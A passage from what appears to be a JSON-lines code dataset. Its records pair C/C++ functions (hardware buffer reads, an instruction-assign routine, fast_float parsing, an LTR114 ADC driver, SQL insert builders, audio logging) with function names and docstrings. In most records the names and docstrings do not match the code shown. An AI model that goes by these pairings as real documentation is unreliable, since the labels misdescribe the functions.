d1);\\n\\tset_at<192, 288>(result, demosaicb_rd12_res);\\n\\thw_uint<16> demosaicb_rd13_res = demosaicb_rd13_select(denoise, d0, d1);\\n\\tset_at<208, 288>(result, demosaicb_rd13_res);\\n\\thw_uint<16> demosaicb_rd14_res = demosaicb_rd14_select(denoise, d0, d1);\\n\\tset_at<224, 288>(result, demosaicb_rd14_res);\\n\\thw_uint<16> demosaicb_rd15_res = demosaicb_rd15_select(denoise, d0, d1);\\n\\tset_at<240, 288>(result, demosaicb_rd15_res);\\n\\thw_uint<16> demosaicb_rd16_res = demosaicb_rd16_select(denoise, d0, d1);\\n\\tset_at<256, 288>(result, demosaicb_rd16_res);\\n\\thw_uint<16> demosaicb_rd17_res = demosaicb_rd17_select(denoise, d0, d1);\\n\\tset_at<272, 288>(result, demosaicb_rd17_res);\\n\\treturn result;\\n}'}","id":382}
{"content":"{'function_name': 'varAssign', 'docstring': '\/\/ This case should not be reachable', 'code': 'void assign( Seq<Instr>* seq   \/\/ Target instruction sequence to extend\\n           , Expr *lhsExpr     \/\/ Expression on left-hand side\\n           , Expr *rhs         \/\/ Expression on right-hand side\\n           )\\n{\\n  Expr lhs = *lhsExpr;\\n\\n  AssignCond always;\\n  always.tag = ALWAYS;\\n\\n  \/\/ -----------------------------------------------------------\\n  \/\/ Case: v := rhs, where v is a variable and rhs an expression\\n  \/\/ -----------------------------------------------------------\\n  if (lhs.tag == VAR) {\\n    varAssign(seq, always, lhs.var, rhs);\\n    return;\\n  }\\n\\n  \/\/ ---------------------------------------------------------\\n  \/\/ Case: *lhs := rhs where lhs is not a var or rhs not a var\\n  \/\/ ---------------------------------------------------------\\n  if (lhs.tag == DEREF &&\\n        (lhs.deref.ptr->tag != VAR ||\\n         rhs->tag != VAR)) {\\n    assert(!isLit(lhs.deref.ptr));\\n    lhs.deref.ptr = simplify(seq, lhs.deref.ptr);\\n    rhs = putInVar(seq, rhs);\\n  }\\n\\n  \/\/ -------------------------------------------------\\n  \/\/ Case: *v := rhs where v is a var and rhs is a var\\n  \/\/ -------------------------------------------------\\n  if (lhs.tag == DEREF) {\\n    Instr instr;\\n    instr.tag        = ST1;\\n    instr.ST1.data   = srcReg(rhs->var);\\n    instr.ST1.buffer = A;\\n    seq->append(instr);\\n    instr.tag        = ST2;\\n    instr.ST2.addr   = srcReg(lhs.deref.ptr->var);\\n    instr.ST2.buffer = A;\\n    seq->append(instr);\\n    instr.tag        = ST3;\\n    seq->append(instr);\\n    return;\\n  }\\n\\n  \/\/ This case should not be reachable\\n  assert(false);\\n}'}","id":387}
{"content":"{'function_name': 'round_up_bigint', 'docstring': '\/\/ ....9999 to ...10000, which could cause a false halfway point.', 'code': \"inline void parse_mantissa(bigint& result, parsed_number_string& num, size_t max_digits, size_t& digits) noexcept {\\n  \/\/ try to minimize the number of big integer and scalar multiplication.\\n  \/\/ therefore, try to parse 8 digits at a time, and multiply by the largest\\n  \/\/ scalar value (9 or 19 digits) for each step.\\n  size_t counter = 0;\\n  digits = 0;\\n  limb value = 0;\\n#ifdef FASTFLOAT_64BIT_LIMB\\n  size_t step = 19;\\n#else\\n  size_t step = 9;\\n#endif\\n\\n  \/\/ process all integer digits.\\n  const char* p = num.integer.ptr;\\n  const char* pend = p + num.integer.len();\\n  skip_zeros(p, pend);\\n  \/\/ process all digits, in increments of step per loop\\n  while (p != pend) {\\n    while ((std::distance(p, pend) >= 8) && (step - counter >= 8) && (max_digits - digits >= 8)) {\\n      parse_eight_digits(p, value, counter, digits);\\n    }\\n    while (counter < step && p != pend && digits < max_digits) {\\n      parse_one_digit(p, value, counter, digits);\\n    }\\n    if (digits == max_digits) {\\n      \/\/ add the temporary value, then check if we've truncated any digits\\n      add_native(result, limb(powers_of_ten_uint64[counter]), value);\\n      bool truncated = is_truncated(p, pend);\\n      if (num.fraction.ptr != nullptr) {\\n        truncated |= is_truncated(num.fraction);\\n      }\\n      if (truncated) {\\n        round_up_bigint(result, digits);\\n      }\\n      return;\\n    } else {\\n      add_native(result, limb(powers_of_ten_uint64[counter]), value);\\n      counter = 0;\\n      value = 0;\\n    }\\n  }\\n\\n  \/\/ add our fraction digits, if they're available.\\n  if (num.fraction.ptr != nullptr) {\\n    p = num.fraction.ptr;\\n    pend = p + num.fraction.len();\\n    if (digits == 0) {\\n      skip_zeros(p, pend);\\n    }\\n    \/\/ process all digits, in increments of step per loop\\n    while (p != pend) {\\n      while ((std::distance(p, pend) >= 8) && (step - counter >= 8) && (max_digits - digits >= 8)) {\\n        parse_eight_digits(p, value, counter, digits);\\n      }\\n      while (counter < step && p != pend && digits < max_digits) {\\n        parse_one_digit(p, value, counter, digits);\\n      }\\n      if (digits == max_digits) {\\n        \/\/ add the temporary value, then check if we've truncated any digits\\n        add_native(result, limb(powers_of_ten_uint64[counter]), value);\\n        bool truncated = is_truncated(p, pend);\\n        if (truncated) {\\n          round_up_bigint(result, digits);\\n        }\\n        return;\\n      } else {\\n        add_native(result, limb(powers_of_ten_uint64[counter]), value);\\n        counter = 0;\\n        value = 0;\\n      }\\n    }\\n  }\\n\\n  if (counter != 0) {\\n    add_native(result, limb(powers_of_ten_uint64[counter]), value);\\n  }\\n}\"}","id":388}
{"content":"{'function_name': 'LTR114_GetErrorString', 'docstring': '\/*\\n     * \u041e\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u0438\u0435 \u0441\u0442\u0440\u043e\u043a\u0438 \u0441 \u0441\u043e\u043e\u0431\u0448\u0435\u043d\u0438\u0435\u043c \u043e\u0431 \u043e\u0448\u0438\u0431\u043a\u0435, \u0441\u043e\u043e\u0442\u0432\u0435\u0442\u0441\u0432\u0443\u044e\u0449\u0435\u0439 \u0437\u0430\u0434\u0430\u043d\u043d\u043e\u043c\u0443 \u043a\u043e\u0434\u0443 \u043e\u0448\u0438\u0431\u043a\u0438.\\n     * \u041e\u041f\u0418\u0421\u0410\u041d\u0418\u0415\\n     * \u041f\u0410\u0420\u0410\u041c\u0415\u0422\u0420\u042b\\n     *   err - \u043a\u043e\u0434 \u043e\u0448\u0438\u0431\u043a\u0438 (\u0434\u043e\u043b\u0436\u0435\u043d \u0431\u044b\u0442\u044c \u043e\u0442\u0440\u0438\u0446\u0438\u0442\u0435\u043b\u044c\u043d\u044b\u043c), \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u0442\u0441\u044f \u0444\u0443\u043d\u043a\u0446\u0438\u044f\u043c\u0438 \u0440\u0430\u0431\u043e\u0442\u044b \u0441 LTR114.\\n     * \u0412\u041e\u0417\u0412\u0420\u0410\u0429\u0410\u0415\u041c\u041e\u0415 \u0417\u041d\u0410\u0427\u0415\u041d\u0418\u0415\\n     *   \u0423\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044c \u043d\u0430 \u0441\u0442\u0440\u043e\u043a\u0443 \u0441 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435\u043c \u043e\u0431 \u043e\u0448\u0438\u0431\u043a\u0435, \u0441\u043e\u043e\u0442\u0432\u0435\u0442\u0441\u0432\u0443\u044e\u0449\u0435\u043c\u0443 \u0437\u0430\u0434\u0430\u043d\u043d\u043e\u043c\u0443 \u043a\u043e\u0434\u0443.\\n     *   NULL - \u043d\u0435\u0438\u0437\u0432\u0435\u0441\u0442\u043d\u044b\u0439 \u043a\u043e\u0434 \u043e\u0448\u0438\u0431\u043a\u0438.\\n     *\/', 'code': 'INT LTR114_GetFrame\\n    (\\n    PTLTR114 hnd,\\n    DWORD *buf\\n    )\\n{\\n    \/*\\n     * \u0421\u0431\u043e\u0440 \u043e\u0434\u043d\u043e\u0433\u043e \u043a\u0430\u0434\u0440\u0430 \u0441 \u0410\u0426\u041f \u043c\u043e\u0434\u0443\u043b\u044f LTR11.\\n     * \u041e\u041f\u0418\u0421\u0410\u041d\u0418\u0415\\n     *   \u041c\u043e\u0434\u0443\u043b\u044c LTR11 \u043f\u0435\u0440\u0435\u0432\u043e\u0434\u0438\u0442\u0441\u044f \u0432 \u0440\u0435\u0436\u0438\u043c \u0441\u0431\u043e\u0440\u0430 \u043e\u0434\u043d\u043e\u0433\u043e \u043a\u0430\u0434\u0440\u0430 \u0434\u0430\u043d\u043d\u044b\u0445.\\n     *   \u041f\u0440\u0438\u043d\u044f\u0442\u044b\u0439 \u043f\u043e\u0442\u043e\u043a \u0434\u0430\u043d\u043d\u044b\u0445 \u043e\u0442 \u043c\u043e\u0434\u0443\u043b\u044f \u0437\u0430\u043d\u043e\u0441\u0438\u0442\u0441\u044f \u0432 \u0431\u0443\u0444\u0435\u0440. \u041e\u043a\u043e\u043d\u0447\u0430\u043d\u0438\u0435 \u0441\u0431\u043e\u0440\u0430 \u0434\u0430\u043d\u043d\u044b\u0445 \u043f\u0440\u043e\u0438\u0437\u0432\u043e\u0434\u0438\u0442\u0441\u044f\\n     *   \u043f\u043e \u043f\u0440\u0438\u0435\u043c\u0443 \u043f\u043e\u0434\u0442\u0432\u0435\u0440\u0436\u0434\u0435\u043d\u0438\u044f \u043f\u0435\u0440\u0435\u0445\u043e\u0434\u0430 \u0432 \u0440\u0435\u0436\u0438\u043c \u043e\u0436\u0438\u0434\u0430\u043d\u0438\u044f \u0438\u043b\u0438 \u0442\u0430\u0439\u043c-\u0430\u0443\u0442\u0443 (\u0434\u043b\u0438\u0442\u0435\u043b\u044c\u043d\u043e\u0441\u0442\u044c \u0442\u0430\u0439\u043c-\u0430\u0443\u0442\u0430\\n     *   \u0437\u0430\u0432\u0438\u0441\u0438\u0442 \u043e\u0442 \u0447\u0430\u0441\u0442\u043e\u0442\u044b \u0434\u0438\u0441\u043a\u0440\u0435\u0442\u0438\u0437\u0430\u0446\u0438\u0438).\\n     * \u041f\u0410\u0420\u0410\u041c\u0415\u0422\u0420\u042b\\n     *   hnd - \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044c \u043d\u0430 \u043e\u043f\u0438\u0441\u0430\u0442\u0435\u043b\u044c \u0441\u043e\u0441\u0442\u043e\u044f\u043d\u0438\u044f \u043c\u043e\u0434\u0443\u043b\u044f;\\n     *   buf - \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044c \u043d\u0430 \u0431\u0443\u0444\u0435\u0440, \u0432 \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u0431\u0443\u0434\u0443\u0442 \u0437\u0430\u043f\u0438\u0441\u044b\u0432\u0430\u0442\u044c\u0441\u044f \u043f\u0440\u0438\u043d\u0438\u043c\u0430\u0435\u043c\u044b\u0435 \u043e\u0442 \u043c\u043e\u0434\u0443\u043b\u044f \u0434\u0430\u043d\u043d\u044b\u0435.\\n     * \u0412\u041e\u0417\u0412\u0420\u0410\u0429\u0410\u0415\u041c\u041e\u0415 \u0417\u041d\u0410\u0427\u0415\u041d\u0418\u0415\\n     *   \u041f\u043e\u043b\u043e\u0436\u0438\u0442\u0435\u043b\u044c\u043d\u043e\u0435 \u0447\u0438\u0441\u043b\u043e \u0438\u043b\u0438 0 - \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0431\u0430\u0439\u0442 \u0432 \u043f\u0440\u0438\u043d\u044f\u0442\u043e\u043c \u043a\u0430\u0434\u0440\u0435.\\n     *   \u041e\u0442\u0440\u0438\u0446\u0430\u0442\u0435\u043b\u044c\u043d\u043e\u0435 \u0447\u0438\u0441\u043b\u043e       - \u043a\u043e\u0434 \u043e\u0448\u0438\u0431\u043a\u0438 (\u0441\u043c. \u0437\u0430\u0433\u043e\u043b\u043e\u0432\u043e\u0447\u043d\u044b\u0439 \u0444\u0430\u0439\u043b).\\n     *\/\\n    DWORD cmd;\\n    DWORD rd_buf[LTR114_MAX_LCHANNEL*2 + 2];\\n    INT ret_val = 0, res;\\n    double adcrate;\\n\\n    if (hnd == NULL)\\n        return LTR114_ERR_INVALID_DESCR;\\n    if (hnd->Active)\\n        return LTR114_ERR_ALREADY_RUN;\\n\\tif (hnd->Reserve==NULL)\\n\\t\\treturn LTR114_ERR_MODULE_CLOSED;\\n        \\n    if ((hnd->LChQnt <= 0) || (LTR114_MAX_LCHANNEL < hnd->LChQnt))\\n        return LTR114_ERR_INVALID_ADCLCHQNT;\\n    \\n    if ((adcrate = LTR114_FREQ((*hnd))) <= 0.0)\\n       return LTR114_ERR_INVALID_ADCRATE;\\n    \\n\\t\/\/\u0437\u0430\u043f\u0443\u0441\u043a \u043a\u0430\u043b\u0438\u0431\u0440\u043e\u0432\u043a\u0438, \u0435\u0441\u043b\u0438 \u043d\u0435 \u0431\u044b\u043b\u0430 \u043f\u0440\u043e\u0438\u0437\u0432\u0435\u0434\u0435\u043d\u0430\\n\\tif (!(((PLTR114_INTERNAL_DATA)hnd->Reserve)->status & LTR114_INTSTATUS_CALIBRATED) && \\n\\t\\t!(hnd->SpecialFeatures & LTR114_FEATURES_CBR_DIS))\\n\\t{\\n\\t\\tres = LTR114_Calibrate(hnd);\\n\\t\\tif (res!=LTR_OK)\\n\\t\\t\\treturn res;\\n\\t}\\n\\n\\n   \/\/ hnd->Active = TRUE;\\n    if ((ret_val = start_ltr114(hnd, 1)) == LTR_OK)\\n    {\\n        long n;\\n        DWORD *pbuf;\\n        DWORD tick;\\n        DWORD tm_out;\\n\\n        tick = GetTickCount();\\n        \/* \u0432\u044b\u0447\u0438\u0441\u043b\u0435\u043d\u0438\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f \u0442\u0430\u0439\u043c-\u0430\u0443\u0442\u0430 \u0441\u0431\u043e\u0440\u0430 \u0434\u0430\u043d\u043d\u044b\u0445 \u0434\u043b\u044f \u0434\u0430\u043d\u043d\u043e\u0439 \u0447\u0430\u0441\u0442\u043e\u0442\u044b \u0434\u0438\u0441\u043a\u0440\u0435\u0442\u0438\u0437\u0430\u0446\u0438\u0438 *\/\\n        tm_out = (DWORD)((double)1 * hnd->FrameLength \/ adcrate + ack_tm_out + 0.5);\\n        pbuf = rd_buf;\\n        do\\n        {\\n            if ((n = LTR_Recv(&hnd->Channel, pbuf, NULL, 2*hnd->LChQnt + 1, tm_out)) < 0)\\n            {\\n                ret_val = n;\\n            }\\n            else if (n > 0)\\n            {\\n                unsigned a;\\n\\n                \/* \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043e\u043a\u043e\u043d\u0447\u0430\u043d\u0438\u044f \u0441\u0431\u043e\u0440\u0430 \u043a\u0430\u0434\u0440\u0430 (\u043f\u043e \u043f\u0440\u0438\u0445\u043e\u0434\u0443 \u043f\u043e\u0434\u0442\u0432\u0435\u0440\u0436\u0434\u0435\u043d\u0438\u044f) *\/\\n               pbuf += n;\\n                a = pbuf[-1] & ack_mask;\\n                if (a == stop_ack)                   \/* \u043f\u043e\u043b\u0443\u0447\u0435\u043d \u043e\u0434\u0438\u043d \u043a\u0430\u0434\u0440 \u0434\u0430\u043d\u043d\u044b\u0445 *\/\\n                {\\n                    ret_val = pbuf - rd_buf;\\n                    if (--ret_val <= 0)\\n                    {\\n                        ret_val = LTR114_ERR_GETFRAME;\\n                    }\\n                    else\\n                    {\\n                        (void)memcpy(buf, rd_buf, ret_val * sizeof(DWORD));\\n                    }\\n                }\\n                else if (n < hnd->LChQnt + 1)        \/* \u043d\u0435\u0442 \u043f\u043e\u0434\u0442\u0432\u0435\u0440\u0436\u0434\u0435\u043d\u0438\u044f \u043e\u043a\u043e\u043d\u0447\u0430\u043d\u0438\u044f \u0441\u0431\u043e\u0440\u0430 \u0434\u0430\u043d\u043d\u044b\u0445 *\/\\n                {\\n                    ret_val = LTR114_ERR_GETFRAME;\\n                }\\n             }\\n        } while ((f_elapsed_time(tick) <= tm_out) && (ret_val == LTR_OK) && (n > 0));\\n    }\\n\\n    cmd = LTR010CMD_STOP;  \/\/\u043e\u0441\u0442\u0430\u043d\u043e\u0432 \u043c\u043e\u0434\u0443\u043b\u044f - \u043f\u043e\u0441\u044b\u043b\u043a\u0430 \u043a\u043e\u043c\u0430\u043d\u0434\u044b STOP\\n        \\n    LTR_Send(&hnd->Channel, &cmd, 1, send_tm_out); \\n\\n    hnd->Active = FALSE;\\n\\n    return ret_val;\\n}'}","id":390}
{"content":"{'function_name': 'GetConsoleData', 'docstring': '\/\/ \u30af\u30ea\u30c6\u30a3\u30ab\u30eb\u30bb\u30af\u30b7\u30e7\u30f3', 'code': 'DWORD UpdateConsoleData(UPDATE_COMSOLE_DATA& data)\\n{\\n\\t\/\/ \u30af\u30ea\u30c6\u30a3\u30ab\u30eb\u30bb\u30af\u30b7\u30e7\u30f3\\n\\tCoCriticalSectionCtrl critical(GetConsoleCritical());\\n\\n\\tUPDATE_COMSOLE_DATA& console_data = GetConsoleData(data.macaddr, critical);\\n\\tif (&console_data == NULL)\\n\\t{\\n\\t\\treturn -1;\\n\\t}\\n\\n\\tif (strcmp((LPCTSTR)console_data.status, \"OFFDUTY\") == 0)\\n\\t{\\n\\t\\tconsole_data.ipaddr.Empty();\\n\\t\\tconsole_data.ipmask.Empty();\\n\\n\\t\\treturn 0;\\n\\t}\\n\\n\\t\/\/ \u6700\u7d42\u66f4\u65b0\\n\\tGetSystemTime(&console_data.latest_time);\\n\\tSystemTimeToTzSpecificLocalTime(NULL, &console_data.latest_time, &console_data.latest_time);\\n\\n\\tif (!data.ipaddr.IsEmpty())\\n\\t{\\n\\t\\tconsole_data.ipaddr = data.ipaddr;\\n\\t}\\n\\tif (!data.ipmask.IsEmpty())\\n\\t{\\n\\t\\tconsole_data.ipmask = data.ipmask;\\n\\t}\\n\\tif (!data.hostname.IsEmpty())\\n\\t{\\n\\t\\tconsole_data.hostname = data.hostname;\\n\\t}\\n\\tif (!data.username.IsEmpty())\\n\\t{\\n\\t\\tconsole_data.username = data.username;\\n\\t}\\n\\tif (!data.boot_time.IsEmpty())\\n\\t{\\n\\t\\tconsole_data.boot_time = data.boot_time;\\n\\t}\\n\\tif (!data.time_span.IsEmpty())\\n\\t{\\n\\t\\tconsole_data.time_span = data.time_span;\\n\\t}\\n\\tif (!data.cpu_usage.IsEmpty())\\n\\t{\\n\\t\\tconsole_data.cpu_usage = data.cpu_usage;\\n\\t}\\n\\tif (!data.process.IsEmpty())\\n\\t{\\n\\t\\tconsole_data.process = data.process;\\n\\t}\\n\\tif (!data.dwMemoryLoad.IsEmpty())\\n\\t{\\n\\t\\tconsole_data.dwMemoryLoad = data.dwMemoryLoad;\\n\\t}\\n\\tif (!data.dwTotalPhys.IsEmpty())\\n\\t{\\n\\t\\tconsole_data.dwTotalPhys = data.dwTotalPhys;\\n\\t}\\n\\tif (!data.dwAvailPhys.IsEmpty())\\n\\t{\\n\\t\\tconsole_data.dwAvailPhys = data.dwAvailPhys;\\n\\t}\\n\\tif (!data.dwTotalVirtual.IsEmpty())\\n\\t{\\n\\t\\tconsole_data.dwTotalVirtual = data.dwTotalVirtual;\\n\\t}\\n\\tif (!data.dwAvailVirtual.IsEmpty())\\n\\t{\\n\\t\\tconsole_data.dwAvailVirtual = data.dwAvailVirtual;\\n\\t}\\n\\tif (!data.ulFreeBytesAvailable.IsEmpty())\\n\\t{\\n\\t\\tconsole_data.ulFreeBytesAvailable = data.ulFreeBytesAvailable;\\n\\t}\\n\\tif (!data.ulTotalNumberOfBytes.IsEmpty())\\n\\t{\\n\\t\\tconsole_data.ulTotalNumberOfBytes = data.ulTotalNumberOfBytes;\\n\\t}\\n\\tif (!data.ulTotalNumberOfFreeBytes.IsEmpty())\\n\\t{\\n\\t\\tconsole_data.ulTotalNumberOfFreeBytes = data.ulTotalNumberOfFreeBytes;\\n\\t}\\n\\tif (!data.in_packet.IsEmpty())\\n\\t{\\n\\t\\tconsole_data.in_packet = data.in_packet;\\n\\t}\\n\\tif (!data.out_packet.IsEmpty())\\n\\t{\\n\\t\\tconsole_data.out_packet = data.out_packet;\\n\\t}\\n\\tif (!data.connections.IsEmpty())\\n\\t{\\n\\t\\tconsole_data.connections = data.connections;\\n\\t}\\n\\n\\treturn 0;\\n}'}","id":394}
{"content":"{'function_name': 'get_fieldtest_time', 'docstring': '\/\/   cout << \"inside databasefunc::get_fieldtest_time()\" << endl;', 'code': 'bool insert_platform(gis_database* gis_database_ptr,string description)\\n   {\\n\/\/      cout << \"inside databasefunc::insert_platform()\" << endl;\\n\\n      string curr_insert_command=\\n         databasefunc::generate_insert_platform_SQL_command(description);\\n      \\n      vector<string> insert_commands;\\n      insert_commands.push_back(curr_insert_command);\\n\/\/      cout << \"insert_commands.back() = \" << insert_commands.back() << endl;\\n\/\/      cout << \"gis_database_ptr = \" << gis_database_ptr << endl;\\n\\n      gis_database_ptr->set_SQL_commands(insert_commands);\\n      return gis_database_ptr->execute_SQL_commands();\\n   }'}","id":396}
{"content":"{'function_name': 'denoise_rd1_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<32> denoiseb_denoise_update_0_read_bundle_read(denoiseb_cache& denoiseb, int d0, int d1) {\\n  \/\/ # of ports in bundle: 2\\n    \/\/ denoise_rd0\\n    \/\/ denoise_rd1\\n\\n\\thw_uint<32> result;\\n\\thw_uint<16> denoise_rd0_res = denoise_rd0_select(denoiseb, d0, d1);\\n\\tset_at<0, 32>(result, denoise_rd0_res);\\n\\thw_uint<16> denoise_rd1_res = denoise_rd1_select(denoiseb, d0, d1);\\n\\tset_at<16, 32>(result, denoise_rd1_res);\\n\\treturn result;\\n}'}","id":397}
{"content":"{'function_name': 'insert_camera_metadata', 'docstring': '\/\/      cout << \"inside databasefunc::insert_aircraft_metadata()\" << endl;', 'code': 'string generate_insert_camera_metadata_SQL_command(\\n      int campaign_ID,int mission_ID,int frame_ID,\\n      double horiz_FOV,double vert_FOV,\\n      double camera_az,double camera_el,double camera_roll)\\n   {\\n\/\/   cout << \"inside databasefunc::generate_insert_camera_metadata_SQL_command()\" << endl;\\n\\n      string SQL_command=\"insert into camera_metadata \";\\n      SQL_command += \"(campaign_ID,mission_ID,frame_ID,horiz_fov,vert_fov,camera_azimuth,camera_elevation,camera_roll) \";\\n      SQL_command += \"values( \";\\n      SQL_command += stringfunc::number_to_string(campaign_ID)+\",\";\\n      SQL_command += stringfunc::number_to_string(mission_ID)+\",\";\\n      SQL_command += stringfunc::number_to_string(frame_ID)+\",\";\\n      SQL_command += stringfunc::number_to_string(horiz_FOV)+\",\";\\n      SQL_command += stringfunc::number_to_string(vert_FOV)+\",\";\\n      SQL_command += stringfunc::number_to_string(camera_az)+\",\";\\n      SQL_command += stringfunc::number_to_string(camera_el)+\",\";\\n      SQL_command += stringfunc::number_to_string(camera_roll);\\n      SQL_command += \");\";\\n\\n\/\/      cout << SQL_command << endl;\\n      return SQL_command;\\n   }'}","id":399}
{"content":"{'function_name': 'elite_allocbuf_and_log_data_pkt', 'docstring': '\/* while loop *\/', 'code': 'ADSPResult elite_log_buffer(void *log_pkt_ptr, elite_log_info  *log_info_ptr)\\n{\\n    ADSPResult                          result = ADSP_EOK;\\n    audiolog_header_cmn                 *log_header_cmn;\\n    audiolog_pcm_data_format            *pcm_data_fmt;\\n    audiolog_bitstream_data_format      *bs_data_fmt;\\n    pcm_data_info                       *pcm_data_info_ptr;\\n    uint32_t                            i;\\n    uint8_t                             *log_dst_ptr = NULL;\\n    log_pkt_pcm_data                            *pcm_data_pkt_ptr;\\n    log_pkt_bitstream_data                  *bs_data_pkt_ptr;\\n    bool_t                                      is_seg_pkt = FALSE;\\n    uint32_t                                        num_channels = 0;\\n    uint32_t                                        num_bytes_per_channel = 0;\\n    uint32_t                                        total_num_bytes_per_channel = 0;\\n\\n\\n    if( (NULL == log_info_ptr) || (NULL == log_pkt_ptr) )\\n    {\\n        MSG(MSG_SSID_QDSP6, DBG_ERROR_PRIO, \"EliteLoggingUtil : Log pkt ptr or log info ptr is NULL\");\\n        return ADSP_EFAILED;\\n    }\\n\\n    \/* Check if the data format is either PCM or BITSTREAM *\/\\n    if( (log_info_ptr->data_fmt != ELITE_LOG_DATA_FMT_PCM) &&\\n         (log_info_ptr->data_fmt != ELITE_LOG_DATA_FMT_BITSTREAM) )\\n    {\\n        MSG_2(MSG_SSID_QDSP6, DBG_HIGH_PRIO, \"EliteLoggingUtil : Invalid data format : %u for QXDM log code 0x%X\", log_info_ptr->data_fmt, log_info_ptr->qxdm_log_code);\\n        return ADSP_EFAILED;\\n    }\\n\\n    pcm_data_pkt_ptr = (log_pkt_pcm_data *)log_pkt_ptr;\\n\\n    \/* Common for both PCM and BS data *\/\\n    log_header_cmn = &(pcm_data_pkt_ptr->log_header_pcm.cmn_struct);\\n\\n    if(ELITE_SEG_PKT == log_header_cmn->log_seg_number)\\n    {\\n        is_seg_pkt = TRUE;\\n\\n        total_num_bytes_per_channel = log_header_cmn->fragment_offset;\\n    }\\n\\n    \/* Fill in the common header for PCM and bitstream data *\/\\n\\n    \/*************** AUDIO_LOG_HEADER ***************\/\\n    log_header_cmn->tag = AUDIOLOG_CONTAINER_LOG_HEADER;\\n\\n    if(ELITE_LOG_DATA_FMT_PCM == log_info_ptr->data_fmt)\\n    {\\n        log_header_cmn->size = sizeof(audiolog_header_pcm_data);\\n    }\\n    else \/* bitstream format *\/\\n    {\\n        log_header_cmn->size = sizeof(audiolog_header_bitstream_data);\\n    }\\n\\n    \/* Session ID is any random but unique value corresponding to a QXDM log code.\\n        For same QXDM log code and same tapping point, parser generates a new file\\n        with change in session ID. In general, session ID should be made function\\n        of stream\/device parameters, so that a new log files gets generated if any\\n        of the parameter changes.\\n    *\/\\n\\n    log_header_cmn->log_session_id = log_info_ptr->session_id;\\n\\n\\n    \/* For now log_seq_number is un-used and set to 0.\\n        log_seq_number is supposed to be used as an identifier for\\n        all those chunks. Currently, parser does not support so.\\n        fragment_offset is used for representing the offset of a partial packet\\n        in the original buffer in BYTES.\\n    *\/\\n    log_header_cmn->log_seg_number = 0;\\n\\n    \/* Size (in BYTES) of actual buffer to be logged *\/\\n    log_header_cmn->segment_size = log_info_ptr->buf_size;\\n\\n    \/* Un-used for now, set to 0*\/\\n    log_header_cmn->fragment_offset = 0;\\n\\n    \/*************** AUDIO_LOG_USER_SESSION ***************\/\\n    log_header_cmn->user_session_info.tag = AUDIOLOG_CONTAINER_USER_SESSION;\\n    log_header_cmn->user_session_info.size = sizeof(audiolog_user_session);\\n    \/* User session ID is un-used parameter *\/\\n    log_header_cmn->user_session_info.user_session_id = 0;\\n    log_header_cmn->user_session_info.time_stamp = log_info_ptr->log_time_stamp;\\n\\n    switch(log_info_ptr->data_fmt)\\n    {\\n    case ELITE_LOG_DATA_FMT_PCM:\\n        {\\n            \/*************** AUDIOLOG_PCM_DATA_FORAMT ***************\/\\n\\n            pcm_data_fmt = (audiolog_pcm_data_format *)(&(pcm_data_pkt_ptr->log_header_pcm.pcm_data_fmt));\\n\\n            pcm_data_info_ptr = (pcm_data_info *)(&log_info_ptr->data_info.pcm_data_fmt);\\n\\n            pcm_data_fmt->tag = AUDIOLOG_CONTAINER_PCM_DATA_FORMAT;\\n            pcm_data_fmt->size = sizeof(audiolog_pcm_data_format);\\n            pcm_data_fmt->log_tap_id = log_info_ptr->log_tap_id;\\n            pcm_data_fmt->sampling_rate = pcm_data_info_ptr->sampling_rate;\\n            pcm_data_fmt->num_channels = pcm_data_info_ptr->num_channels;\\n            pcm_data_fmt->pcm_width = pcm_data_info_ptr->bits_per_sample;\\n            pcm_data_fmt->interleaved = pcm_data_info_ptr->interleaved;\\n\\n            if(NULL != pcm_data_info_ptr->channel_mapping)\\n            {\\n                for(i=0; i <  pcm_data_info_ptr->num_channels; i++)\\n                {\\n                    pcm_data_fmt->channel_mapping[i] = pcm_data_info_ptr->channel_mapping[i];\\n                }\\n            }\\n            else \/* Provide the default mapping *\/\\n            {\\n                for(i=0; i <  pcm_data_info_ptr->num_channels; i++)\\n                {\\n                    pcm_data_fmt->channel_mapping[i] = i+1;\\n                }\\n            }\\n\\n            \/* Set the remaining channels elements as un-used *\/\\n            for(i =  pcm_data_info_ptr->num_channels; i < ELITE_MAX_NUM_CH; i++)\\n            {\\n                pcm_data_fmt->channel_mapping[i] = 0;\\n            }\\n\\n            log_dst_ptr = ((log_pkt_pcm_data *)log_pkt_ptr)->payload;\\n        }\\n        break;\\n    case ELITE_LOG_DATA_FMT_BITSTREAM:\\n        {\\n            \/********** AUDIOLOG_BITSTREAM_DATA_FORAMT *************\/\\n\\n            bs_data_pkt_ptr = (log_pkt_bitstream_data *)log_pkt_ptr;\\n\\n            bs_data_fmt = (audiolog_bitstream_data_format *)(&(bs_data_pkt_ptr->log_header_bs.bs_data_fmt));\\n\\n            bs_data_fmt->tag = AUDIOLOG_CONTAINER_BS_DATA_FORMAT;\\n            bs_data_fmt->size = sizeof(audiolog_bitstream_data_format);\\n            bs_data_fmt->log_tap_id = log_info_ptr->log_tap_id;\\n            bs_data_fmt->media_fmt_id = log_info_ptr->data_info.media_fmt_id;\\n\\n            log_dst_ptr = ((log_pkt_bitstream_data *)log_pkt_ptr)->payload;\\n        }\\n        break;\\n    }\\n\\n    \/* Populate the log packet payload with the buffer to be logged *\/\\n\\n    if(FALSE == is_seg_pkt)\\n    {\\n        memscpy(log_dst_ptr, log_info_ptr->buf_size, log_info_ptr->buf_ptr, log_info_ptr->buf_size);\\n    }\\n    else \/* True *\/\\n    {\\n        pcm_data_info_ptr = (pcm_data_info *)(&log_info_ptr->data_info.pcm_data_fmt);\\n\\n        num_channels = pcm_data_info_ptr->num_channels;\\n        num_bytes_per_channel = (log_info_ptr->buf_size \/ num_channels);\\n\\n        for(i=0; i < num_channels; i++)\\n        {\\n            memscpy(log_dst_ptr, num_bytes_per_channel, log_info_ptr->buf_ptr, num_bytes_per_channel);\\n            log_dst_ptr += num_bytes_per_channel;\\n            